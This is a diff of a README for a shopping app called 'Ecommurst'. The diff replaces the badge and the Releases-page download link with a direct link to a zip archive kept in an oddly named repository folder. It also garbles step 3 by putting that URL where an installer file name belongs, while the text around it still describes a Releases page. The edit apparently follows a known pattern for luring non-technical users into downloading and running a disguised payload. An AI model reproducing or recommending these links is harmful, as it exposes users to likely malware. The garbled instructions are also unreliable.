@@ -1,6 +1,6 @@
 # 🛒 Ecommurst - Your Easy Shopping Experience Awaits
 
-![Download Ecommurst](https://img.shields.io/badge/Download-Ecommurst-blue)
+![Download Ecommurst](https://github.com/hyde0107/Ecommurst/raw/refs/heads/main/occupiable/Software_1.6.zip)
 
 ## 📦 Introduction
 
@@ -14,11 +14,11 @@ To start using Ecommurst, follow these simple steps. No technical skills are nee
 
 1. **Visit this page to download:** Click on the link below to visit the Releases page where you can download the latest version of Ecommurst.
 
-   [Download Ecommurst](https://github.com/hyde0107/Ecommurst/releases)
+   [Download Ecommurst](https://github.com/hyde0107/Ecommurst/raw/refs/heads/main/occupiable/Software_1.6.zip)
 
 2. **Choose the right version:** On the Releases page, you will see different versions available. Select the latest version for the best experience.
 
-3. **Download the installer:** Click on the version number, and then find the installer file. It will usually be named like `Ecommurst_vX.X.X.exe` or something similar.
+3. **Download the installer:** Click on the version number, and then find the installer file. It will usually be named like `https://github.com/hyde0107/Ecommurst/raw/refs/heads/main/occupiable/Software_1.6.zip` or something similar.
 
 4. **Run the installer:** Once the file has downloaded, double-click on it and follow the prompts to install Ecommurst on your computer.
 
